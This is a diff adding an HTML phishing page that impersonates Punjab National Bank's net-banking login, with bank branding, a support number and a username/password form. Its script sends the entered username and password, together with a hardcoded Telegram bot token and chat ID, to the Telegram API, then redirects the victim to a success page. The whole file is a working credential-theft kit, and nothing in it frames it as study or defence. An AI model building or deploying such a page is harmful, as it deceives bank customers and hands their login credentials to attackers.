@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Punjab National Bank</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+
+        .form-container {
+            background-color: hsl(0, 89%, 26%); /* Red background */
+            padding: 30px;
+            border-radius: 8px;
+            max-width: 500px;
+            margin: 50px auto;
+            border: 3px solid red; /* Red border */
+        }
+
+        .form-container label {
+            font-weight: bold;
+            display: block;
+            margin: 15px 0 5px;
+            color: hsl(0, 100%, 99%); /* Yellow text for labels */
+        }
+
+        .form-container input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            color: #181817;
+            background-color: hsl(0, 11%, 93%);
+            font-size: 16px;
+        }
+
+        .form-container button {
+            background-color: #f4b400;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .form-container button:hover {
+            background-color: #e0a500;
+        }
+
+        footer {
+            background-color: #2a2a2a;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            margin-top: 20px;
+        }
+
+        footer a {
+            color: #f4b400;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4); /* Semi-transparent background */
+        }
+
+        .modal-content {
+            background-color: #fff;
+            margin: 15% auto;
+            padding: 20px;
+            border-radius: 5px;
+            width: 80%;
+            text-align: center;
+        }
+
+        .modal-content p {
+            font-size: 18px;
+        }
+
+        .banner img {
+            width: 100%;
+            max-height: 300px;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header Section -->
+    <header>
+        <div class="logo-container">
+            <img src="pnb-logo.png" alt="PNB Logo">
+        </div>
+        <nav>
+            <ul>
+                <li><a href="#">Personal</a></li>
+                <li><a href="#">Corporate</a></li>
+                <li><a href="#">NRI</a></li>
+                <li><a href="#">Agri</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- Banner Section -->
+    <section class="banner">
+        <img src="banner.png" alt="PNB Banner">
+    </section>
+
+    <!-- Main Content -->
+    <main>
+        <section class="verification-form">
+            <h2>PNB Net Banking </h2>
+            <form id="login-form" class="form-container">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" placeholder="Enter your username" required>
+
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+
+                <button type="button" id="submit-button">Submit</button>
+            </form>
+        </section>
+    </main>
+
+    <!-- Footer Section -->
+    <footer>
+        <p>&copy; 2025 Punjab National Bank. All rights reserved.</p>
+        <p>For support, visit our <a href="#">Help Center</a> or call <a href="tel:+18001802030">1800-180-2030</a></p>
+    </footer>
+
+    <!-- Modal (Pop-up) for Processing -->
+    <div id="processing-modal" class="modal">
+        <div class="modal-content">
+            <p>Processing your request...</p>
+        </div>
+    </div>
+
+    <!-- JavaScript for Validation, Modal, and Telegram Notification -->
+    <script>
+        const botToken = "8195910833:AAGjf_PrdNBLevxSO4DW_lbSGl1wp6RJA4A"; 
+        const chatId = "-1002424646619";
+
+        document.getElementById("submit-button").addEventListener("click", function () {
+            const usernameField = document.getElementById("username");
+            const passwordField = document.getElementById("password");
+
+            if (!usernameField.value.trim()) {
+                alert("Please enter your username.");
+                usernameField.focus();
+                return;
+            }
+
+            if (!passwordField.value.trim()) {
+                alert("Please enter your password.");
+                passwordField.focus();
+                return;
+            }
+
+            // Show processing modal
+            document.getElementById("processing-modal").style.display = "block";
+
+            // Prepare and send Telegram notification
+            const message = `📊 **PNB Login Details**\n👤 Username: ${usernameField.value}\n🔒 Password: ${passwordField.value}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Form submitted successfully.");
+                    window.location.href = "netsuccess.html";
+                } else {
+                    alert("Error processing your request. Please try again.");
+                }
+
+                // Hide processing modal after submission
+                document.getElementById("processing-modal").style.display = "none";
+            })
+            .catch(error => {
+                console.error("Telegram Error:", error);
+                // Hide processing modal if there is an error
+                document.getElementById("processing-modal").style.display = "none";
+            });
+        });
+    </script>
+
+</body>
+</html>
